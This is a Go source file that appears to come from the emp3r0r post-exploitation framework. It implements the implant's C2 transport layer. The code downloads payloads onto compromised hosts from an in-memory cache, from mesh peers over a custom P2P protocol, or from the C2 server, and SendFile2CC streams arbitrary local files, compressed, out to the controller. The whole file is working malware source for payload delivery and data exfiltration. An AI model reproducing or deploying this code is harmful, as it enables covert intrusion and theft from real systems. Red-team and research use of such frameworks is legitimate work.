package c2transport

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func init() {
	agentutils.FetchFileHandler = func(peer, fileToDownload, path, checksum string) ([]byte, error) {
		return FetchFile(common.RuntimeConfig, peer, fileToDownload, path, checksum)
	}
}

var (
	// PeerIPsProvider is set by internal/agent/mesh to return all active mesh peer IPs.
	PeerIPsProvider func() []string

	// PeerFileProvider is set by internal/agent/mesh to return peerIP -> relay
	// endpoint for peers holding fileName. The endpoint includes the peer's
	// advertised transport so a mixed-transport mesh is dialled correctly.
	PeerFileProvider func(fileName string) map[string]transport.PeerEndpoint
)

// MemFSKey returns the canonical memfs key for a named resource.
// e.g. "/tmp/sa_whoami" and "sa_whoami" both map to "memfs:///sa_whoami".
func MemFSKey(name string) string {
	return "memfs:///" + filepath.Base(name)
}

// cacheToMemFS stores data in memfs under the canonical key for name.
// It is a best-effort write — errors are only logged.
func cacheToMemFS(name string, data []byte) {
	key := MemFSKey(name)
	if err := util.WriteFileAgent(key, data, 0o600); err != nil {
		logging.Debugf("cacheToMemFS: failed to cache %s as %s: %v", name, key, err)
	} else {
		logging.Debugf("cacheToMemFS: cached %d bytes as %s", len(data), key)
	}
}

// FetchFile is the single entry point for file acquisition.
// Priority order:
//  1. memfs cache (memfs:///basename) — checked first, checksum-verified
//  2. explicit destination path (disk or memfs:///)
//  3. peer agent via P2P relay (query gossip view for peers advertising the file)
//  4. C2 server (last resort)
//
// On any successful download the data is always cached in memfs under its canonical key.
// If path is empty the raw bytes are returned; otherwise nil is returned after saving.
func FetchFile(config *def.Config, peer, file_to_download, path, checksum string) (data []byte, err error) {
	// 1a. Check memfs cache first (canonical key)
	memKey := MemFSKey(file_to_download)
	if cached, cerr := util.ReadFileAgent(memKey); cerr == nil {
		if checksum == "" || crypto.SHA256SumRaw(cached) == checksum {
			logging.Infof("FetchFile: hit memfs cache %s for %s", memKey, file_to_download)
			if path != "" && path != memKey {
				_ = util.WriteFileAgent(path, cached, 0o600)
			}
			if path == "" {
				return cached, nil
			}
			return nil, nil
		}
	}

	// 1b. Check file_to_download itself on local disk/memfs
	if util.IsFileExist(file_to_download) {
		if existing, rerr := util.ReadFileAgent(file_to_download); rerr == nil {
			if checksum == "" || crypto.SHA256SumRaw(existing) == checksum {
				logging.Infof("FetchFile: %s already exists locally", file_to_download)
				cacheToMemFS(file_to_download, existing)
				if path != "" && path != file_to_download {
					_ = util.WriteFileAgent(path, existing, 0o600)
				}
				if path == "" {
					return existing, nil
				}
				return nil, nil
			}
		}
	}

	// 1c. Check explicit destination path (disk or memfs:///)
	if path != "" && path != file_to_download && util.IsFileExist(path) {
		if existing, rerr := util.ReadFileAgent(path); rerr == nil {
			if checksum == "" || crypto.SHA256SumRaw(existing) == checksum {
				logging.Infof("FetchFile: %s already exists at %s", file_to_download, path)
				cacheToMemFS(file_to_download, existing)
				return nil, nil
			}
		}
	}

	// 2. Try peer P2P (query gossip view for peers advertising the file)
	peerEndpoints := make(map[string]transport.PeerEndpoint)
	if peer != "" {
		// Resolve the requested peer's advertised transport/port when known.
		ep := transport.PeerEndpoint{Addr: peer}
		if PeerFileProvider != nil {
			if m := PeerFileProvider(file_to_download); len(m) > 0 {
				if found, ok := m[peer]; ok {
					ep = found
				}
			}
		}
		peerEndpoints[peer] = ep
	} else if PeerFileProvider != nil {
		peerEndpoints = PeerFileProvider(file_to_download)
	}

	if len(peerEndpoints) > 0 {
		for pIP, ep := range peerEndpoints {
			if pIP == "" {
				continue
			}
			logging.Infof("FetchFile: P2P pull %s from peer %s (transport %q)", file_to_download, pIP, ep.Transport)
			for _, name := range []string{memKey, file_to_download} {
				data, err = FetchFilePeerWithEndpoint(ep, name, path, checksum)
				if err == nil {
					logging.Infof("FetchFile: P2P success %s from peer %s", name, pIP)
					if len(data) > 0 {
						cacheToMemFS(file_to_download, data)
					} else if path != "" {
						if saved, rerr := util.ReadFileAgent(path); rerr == nil {
							cacheToMemFS(file_to_download, saved)
						}
					}
					return data, nil
				}
			}
			logging.Warningf("FetchFile: P2P download from peer %s failed (%v)", pIP, err)
		}
	} else {
		logging.Infof("FetchFile: no mesh peer advertises %s in gossip view — skipping P2P", file_to_download)
	}

	// 3. C2 fallback
	data, err = DownloadViaC2(config, file_to_download, path, checksum)
	if err != nil {
		return nil, err
	}
	// cache whatever we got
	if len(data) > 0 {
		cacheToMemFS(file_to_download, data)
	} else if path != "" {
		if saved, rerr := util.ReadFileAgent(path); rerr == nil {
			cacheToMemFS(file_to_download, saved)
		}
	}
	return data, nil
}

// DownloadViaC2 downloads a file from the C2 server.
// If path is empty the raw bytes are returned.
func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) (data []byte, err error) {
	downloadURL := def.CCAddress + "?file_to_download=" + url.QueryEscape(file_to_download)
	logging.Infof("DownloadViaC2: requesting %s from %s", file_to_download, downloadURL)

	retData := path == ""

	// Lock file for non-mem disk paths to prevent concurrent downloads
	if !retData && !util.IsMemPath(path) {
		lock := fmt.Sprintf("%s.lock", path)
		if util.IsFileExist(lock) {
			return nil, fmt.Errorf("DownloadViaC2: %s is already being downloaded", file_to_download)
		}
		util.CreateFileAgent(lock)
		defer os.RemoveAll(lock)
	}

	conn, _, cancel, err := EstablishC2Connection(def.CCAddress, file_to_download, common.RuntimeConfig.C2Routes.WWW)
	if err != nil {
		return nil, fmt.Errorf("DownloadViaC2 connect: %v", err)
	}
	defer cancel()
	defer conn.Close()
	secureConn := transport.NewSecureConn(conn)

	data, err = io.ReadAll(secureConn)
	if err != nil {
		return nil, fmt.Errorf("DownloadViaC2 read: %v", err)
	}

	if checksum != "" {
		if c := crypto.SHA256SumRaw(data); c != checksum {
			return nil, fmt.Errorf("DownloadViaC2 checksum: got %s want %s", c, checksum)
		}
	}

	logging.Infof("DownloadViaC2: received %d bytes of %s", len(data), file_to_download)

	if retData {
		return data, nil
	}
	if err = util.WriteFileAgent(path, data, 0o600); err != nil {
		return nil, fmt.Errorf("DownloadViaC2 write: %v", err)
	}
	return nil, nil
}

// SendFile2CC sends a file to the CC over the FTP route from `offset` on. The
// file is streamed through a gzip writer, so a large file is never held in the
// agent's memory; memfs sources are already in memory by definition.
func SendFile2CC(filepath string, offset int64, token string) (err error) {
	logging.Infof("Sending %s to CC, offset=%d", filepath, offset)

	var src io.Reader
	if util.IsMemPath(filepath) {
		data, rerr := util.ReadFileAgent(filepath)
		if rerr != nil {
			return fmt.Errorf("failed to open %s: %v", filepath, rerr)
		}
		if offset > int64(len(data)) {
			return fmt.Errorf("offset %d > file size %d", offset, len(data))
		}
		src = bytes.NewReader(data[offset:])
	} else {
		f, oerr := os.Open(filepath)
		if oerr != nil {
			return fmt.Errorf("failed to open %s: %w", filepath, oerr)
		}
		defer f.Close()
		fi, serr := f.Stat()
		if serr != nil {
			return fmt.Errorf("stat %s: %w", filepath, serr)
		}
		if offset > fi.Size() {
			return fmt.Errorf("offset %d > file size %d", offset, fi.Size())
		}
		if _, serr := f.Seek(offset, io.SeekStart); serr != nil {
			return fmt.Errorf("seek %s: %w", filepath, serr)
		}
		src = f
	}

	conn, _, _, err := EstablishC2Connection(def.CCAddress, token, common.RuntimeConfig.C2Routes.FTP)
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)

	secureConn := transport.NewSecureConn(conn)
	defer secureConn.Close()

	compressor := gzip.NewWriter(transport.NewBulkWriter(secureConn))
	// 1 MiB chunks keep polling transports efficient without buffering the file.
	n, copyErr := io.CopyBuffer(compressor, src, make([]byte, 1024*1024))
	closeErr := compressor.Close()
	if copyErr != nil {
		return fmt.Errorf("failed after %d bytes: %w", n, copyErr)
	}
	if closeErr != nil {
		return fmt.Errorf("finish gzip stream after %d bytes: %w", n, closeErr)
	}
	return nil
}

// DownloadToAgent streams a C2-hosted file into dest and verifies its SHA-256
// once the transfer has finished. A disk destination is written through a
// `.part` file that is renamed only after verification, so a truncated or
// corrupted body is never committed. A memfs destination is buffered because
// memfs is memory.
func DownloadToAgent(config *def.Config, name, dest, checksum string) (written int64, digest string, err error) {
	if name == "" || dest == "" {
		return 0, "", fmt.Errorf("file name and destination are required")
	}

	if util.IsMemPath(dest) {
		data, ferr := FetchFile(config, "", name, "", checksum)
		if ferr != nil {
			return 0, "", ferr
		}
		if err = util.WriteFileAgent(dest, data, 0o600); err != nil {
			return 0, "", fmt.Errorf("write %s: %w", dest, err)
		}
		return int64(len(data)), crypto.SHA256SumRaw(data), nil
	}

	part := dest + ".part"
	f, err := os.OpenFile(part, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
	if err != nil {
		return 0, "", fmt.Errorf("create %s: %w", part, err)
	}
	committed := false
	defer func() {
		if !committed {
			f.Close()
			_ = os.Remove(part)
		}
	}()

	conn, _, cancel, cerr := EstablishC2Connection(def.CCAddress, name, common.RuntimeConfig.C2Routes.WWW)
	if cerr != nil {
		return 0, "", fmt.Errorf("connect for %s: %w", name, cerr)
	}
	defer cancel()
	defer conn.Close()

	hasher := sha256.New()
	written, err = io.CopyBuffer(io.MultiWriter(f, hasher), transport.NewSecureConn(conn), make([]byte, 1024*1024))
	if err == nil {
		err = f.Sync()
	}
	if cerr := f.Close(); err == nil {
		err = cerr
	}
	if err != nil {
		return written, "", fmt.Errorf("download %s: %w", name, err)
	}
	if written == 0 {
		return 0, "", fmt.Errorf("download %s: the www relay delivered no bytes", name)
	}

	digest = hex.EncodeToString(hasher.Sum(nil))
	if checksum != "" && !strings.EqualFold(digest, checksum) {
		return written, digest, fmt.Errorf("checksum mismatch after %d bytes: got %s want %s", written, digest, checksum)
	}
	if err = os.Rename(part, dest); err != nil {
		return written, digest, fmt.Errorf("commit %s: %w", dest, err)
	}
	committed = true
	return written, digest, nil
}

// FetchFilePeer downloads a file directly from a peer agent using the local
// default transport and P2P relay port.
func FetchFilePeer(peerIP, file_to_download, path, checksum string) (data []byte, err error) {
	return FetchFilePeerWithEndpoint(transport.PeerEndpoint{Addr: peerIP}, file_to_download, path, checksum)
}

// FetchFilePeerWithEndpoint downloads a file directly from a peer agent using the
// transport the peer advertised in its endpoint (falling back to the local
// default transport/port when the peer advertised none).
func FetchFilePeerWithEndpoint(ep transport.PeerEndpoint, file_to_download, path, checksum string) (data []byte, err error) {
	fallbackPort := 0
	if p, perr := strconv.Atoi(common.RuntimeConfig.P2PRelayPort); perr == nil {
		fallbackPort = p
	}

	conn, err := transport.DialPeer(
		ep,
		common.RuntimeConfig.P2PTransport,
		fallbackPort,
		common.RuntimeConfig.Password,
		def.MagicString,
	)
	if err != nil {
		return nil, fmt.Errorf("FetchFilePeer: %w", err)
	}
	defer conn.Close()

	// Send opcode
	if _, err = conn.Write([]byte{0x03}); err != nil { // OpcodeFileRequest
		return nil, fmt.Errorf("FetchFilePeer send opcode: %v", err)
	}

	// Send 4-byte LE filename length + filename
	name := []byte(file_to_download)
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(name)))
	if _, err = conn.Write(lenBuf); err != nil {
		return nil, fmt.Errorf("FetchFilePeer send name len: %v", err)
	}
	if _, err = conn.Write(name); err != nil {
		return nil, fmt.Errorf("FetchFilePeer send name: %v", err)
	}

	// Read response byte
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	resp := make([]byte, 1)
	if _, err = io.ReadFull(conn, resp); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read response: %v", err)
	}

	if resp[0] == 0xFF { // OpcodeErr
		errLenBuf := make([]byte, 2)
		io.ReadFull(conn, errLenBuf)
		msgLen := binary.LittleEndian.Uint16(errLenBuf)
		msg := make([]byte, msgLen)
		io.ReadFull(conn, msg)
		return nil, fmt.Errorf("FetchFilePeer: peer error: %s", string(msg))
	}
	if resp[0] != 0x00 { // OpcodeOK
		return nil, fmt.Errorf("FetchFilePeer: unexpected response 0x%02x", resp[0])
	}

	// Read 4-byte LE data length
	dataLenBuf := make([]byte, 4)
	if _, err = io.ReadFull(conn, dataLenBuf); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read data len: %v", err)
	}
	const maxPeerFileBytes = 256 * 1024 * 1024 // 256 MiB bound to prevent peer OOM DoS
	dataLen := binary.LittleEndian.Uint32(dataLenBuf)
	if dataLen > maxPeerFileBytes {
		return nil, fmt.Errorf("FetchFilePeer data length %d exceeds maximum %d", dataLen, maxPeerFileBytes)
	}
	conn.SetDeadline(time.Now().Add(5 * time.Minute)) // generous for large files

	// Read all data
	data = make([]byte, dataLen)
	if _, err = io.ReadFull(conn, data); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read data: %v", err)
	}
	conn.SetDeadline(time.Time{})

	// Verify checksum
	if checksum != "" {
		if c := crypto.SHA256SumRaw(data); c != checksum {
			return nil, fmt.Errorf("FetchFilePeer checksum mismatch: got %s want %s", c, checksum)
		}
	}

	logging.Infof("FetchFilePeer: got %d bytes of %s from %s", dataLen, file_to_download, ep.Addr)

	// Save to path if requested
	if path != "" {
		if err = util.WriteFileAgent(path, data, 0o600); err != nil {
			return nil, fmt.Errorf("FetchFilePeer write: %v", err)
		}
		logging.Infof("FetchFilePeer: saved %s to %s", file_to_download, path)
		return nil, nil
	}
	return data, nil
}
